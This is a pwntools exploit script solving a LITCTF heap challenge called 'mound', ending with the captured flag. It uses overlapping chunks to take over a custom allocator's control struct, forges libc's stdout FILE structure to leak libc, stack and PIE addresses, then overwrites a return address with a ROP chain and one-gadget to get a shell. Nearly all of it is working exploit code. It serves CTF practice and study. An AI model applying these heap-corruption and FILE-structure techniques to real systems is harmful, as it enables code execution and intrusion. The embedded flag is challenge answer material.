from pwn import *


import warnings
warnings.filterwarnings("ignore", category=BytesWarning)


def create(idx,size):
    p.sendlineafter(">","1")
    p.sendlineafter(">",str(idx))
    p.sendlineafter(">",str(size))

def delete(idx):
    p.sendlineafter(">","2")
    p.sendlineafter(">",str(idx))

def view(idx):
    p.sendlineafter(">","3")
    p.sendlineafter(">",str(idx))

def edit(idx,data):
    p.sendlineafter(">","4")
    p.sendlineafter(">",str(idx))
    p.sendafter(">",data)


elf = context.binary = ELF("MAIN")
env = {}
env["LD_PRELOAD"] = "./libc/libc.so.6"
# p = process(env=env,aslr=False)
p = process(env=env)
# p = remote("localhost", 5000)

# p = remote("litctf.org", 31778)

# create chunk at pos[0] at the mmap heap
create(0,0x90)  
create(1,0x100) 
# create chunk at last position= in the mmap heap
create(2,0x400 - 1)
# will write in the first chunk, bc of overlapping chunks
delete(2)


# leaks addr of last chunk
# mmap leaks and libc leaks
view(0)
p.recvuntil(":")
leak = u64(p.recvline().strip().ljust(8,p8(0)))
base = leak - 0x3bc
print("leak",hex(leak))
print("base",hex(base))


libc = elf.libc
libc.address = base + 0x10000
print("libc.address",hex(libc.address))



# edit linked list, to point to top of mmap
# now we have full contorle over _Mound struct 
edit(0,p64(base) + b"\n")
create(2,0x400 - 1)

# i used overlapping allocations to overwrite stdout to get a arb read primitive
# second way to do it, is to use 
#		memcpy(&mound->list[idx], available->content, 8);
# as a read 8 bytes primitive, i didnt see it xD

print(hex(libc.address + 0x1ed680))
edit(2,cyclic(4) + p64(libc.address + 0x1ed670) * 100)
create(5,0x20)
edit(2,cyclic(4) + p64(libc.address + 0x1ed660) * 100)
create(6,0x20)
edit(6,b"A" * 4 + p64(0xffffffffffffffff) * 2)


# setup stdout with correct values
stdout = [
    0xfbad1887,	0x00007f049c797723,
    0x00007f049c797723,	0x00007f049c797723,
    0x00007f049c797723,	0x00007f049c797723,
    0x00007f049c797724,	0x00007f049c797723,
    0x00007f049c797724,	0x0000000000000000,
    0x0000000000000000,	0x0000000000000000,
    0x0000000000000000,	0x00007f049c796980,
    0x0000000000000001,	0xffffffffffffffff,
    0x000000000a000000,	0x00007f049c7987e0,
    0xffffffffffffffff,	0x0000000000000000,
    0x00007f049c796880,	0x0000000000000000,
    0x0000000000000000,	0x0000000000000000,
    0x00000000ffffffff,	0x6969,
    0x0000000000000000,	0x00007f049c7934a0,
]
for i in range(len(stdout)):
    if stdout[i] >> (8 * 5) == 0x7f:
        stdout[i] = libc.address + stdout[i] - 0x7f049c5aa000



# update required pointers and leak stack
leaks = []
addr = libc.sym["environ"]
stdout[4] = p64(addr)
stdout[5] = p64(addr + 200)
stdout[6] = p64(addr + 200)
stdout[7] = p64(addr + 200)
stdout[8] = p64(addr + 200 + 1)

edit(5,b"A" * 4 + p64(0) * 5 +  flat(stdout) + b"A" * 8)
for i in range(10):
    try:
        leak = u64(p.recv(8).ljust(8,p8(0)))
        leaks.append(leak)
        print(hex(leak))
    except:
        pass

stack_leak = leaks[1]
print("stack_leak",hex(stack_leak))




# update required pointers and leak pie

print("#" * 0x20)
addr = stack_leak  + 0xc0
print("addr",hex(addr))

stdout[4] = p64(addr)
stdout[5] = p64(addr + 100)
stdout[6] = p64(addr + 100)
stdout[7] = p64(addr + 100)
stdout[8] = p64(addr + 100 + 1)

edit(5,b"A" * 44  +  flat(stdout) + b"A" * 8)


leaks = []
for i in range(10):
    leak = u64(p.recv(8).ljust(8,p8(0)))
    leaks.append(leak)
    print(hex(leak))

pie_leak = leaks[1]
print(hex(pie_leak))
elf.address = pie_leak - 0x11a0
print("elf.address",hex(elf.address))



# allocate into the rocks list to get a precise arb read and write primitive

ret = stack_leak - 0x150 
edit(2,cyclic(4) + p64(elf.sym["rocks"] - 0x10) * 100)
create(9,0x100)
edit(9,cyclic(12) + p64(ret - 4 - 8))

rop = ROP(libc)
print(rop.rdx)
print(rop.r15)

# one gadget your way into the flag
edit(0,cyclic(8) + flat([
    rop.rdx.address , 0 , 0,
    rop.r15.address , 0,
    libc.address + 0xe3b01
    
]))



p.interactive()

"""
x /20gx &rocks
x /100gx 0x15555531a000
"""



# LITCTF{s3cr3t_65th_b1n???_4ND_S!Z30F_M0UND_15_516_N07_520?????_m0und_1s_d3c3iv1ng_fs_3f5806e0}
